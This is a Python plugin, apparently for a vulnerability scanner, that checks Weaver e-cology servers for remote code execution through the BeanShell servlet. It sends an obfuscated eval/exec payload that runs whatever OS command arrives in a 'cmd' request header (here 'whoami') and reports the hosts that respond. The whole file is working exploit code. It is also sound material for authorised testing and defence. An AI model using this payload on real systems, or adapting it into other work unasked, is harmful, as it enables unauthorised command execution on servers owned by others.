#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    weaver bsh
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "cmd": "whoami"
            }
            data = 'bsh.script=eval ("ex"%2b"ec (bsh.httpServletRequest.getHeader(\"cmd\"))")&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        url = path + "weaver/bsh.servlet.BshServlet"
                        async with session.post(url=url, headers=headers, data=data) as response:
                            if response!=None:
                                text = await response.text()
                                if 'beanshell' in text:
                                   yield url